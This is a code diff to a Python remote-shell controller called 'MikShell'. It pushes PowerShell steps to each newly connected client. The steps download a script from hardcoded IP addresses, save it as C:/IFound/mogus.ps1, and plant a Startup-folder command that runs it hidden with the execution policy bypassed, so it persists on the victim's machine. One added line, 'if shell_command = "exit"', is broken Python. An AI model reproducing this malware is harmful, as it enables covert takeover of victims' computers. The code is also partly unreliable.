@@ -25,7 +25,7 @@ onlines = {}
 
 macros = {
     "startup": {"args": [], "steps": [
-            "if (Test-Path 'C:/IFound') {} else { mkdir C:/IFound; } Invoke-WebRequest -Uri 'http://194.195.244.202/:8080/raa.ps1' -OutFile 'C:/IFound/mogus.ps1'",
+            "if (Test-Path 'C:/IFound') {} else { mkdir C:/IFound; } Invoke-WebRequest -Uri 'http://194.195.244.202:8080/raa.ps1' -OutFile 'C:/IFound/mogus.ps1'",
             "cd '~/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup'",
             "Write-Output 'cmd /c start /min \"\"  Powershell.exe -ExecutionPolicy ByPass -windowstyle hidden -File \"C:/IFound/mogus.ps1\"' | Out-File ifound.cmd -encoding ASCII",
             "cd ~"
@@ -62,11 +62,7 @@ def client_handler(connection):
         con.execute("INSERT INTO users VALUES (?);",
                     (user, ))
         con.commit()
-        startup_steps = [
-            "if (Test-Path 'C:/IFound') {} else { mkdir C:/IFound; } Invoke-WebRequest -Uri 'http://212.71.248.243:8080/raa.ps1' -OutFile 'C:/IFound/mogus.ps1'",
-            "cd '~/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup'",
-            "Write-Output 'cmd /c start /min \"\"  Powershell.exe -ExecutionPolicy ByPass -windowstyle hidden -File \"C:/IFound/mogus.ps1\"' | Out-File ifound.cmd -encoding ASCII",
-        ]
+        startup_steps = macros["startup"]["steps"]
         for step in startup_steps:
             try:
                 connection.send(step.encode("utf-8"))
@@ -188,6 +184,8 @@ def shell():
         onlines[user]['path'] = path
         shell_command = input(
             f"MikShell|{user.split(' ')[0]}|{user.split(' ')[1]}|\n{path}>")
+        if shell_command = "exit":
+            shell_command = "mikshell-exit"
 
 
 def console():
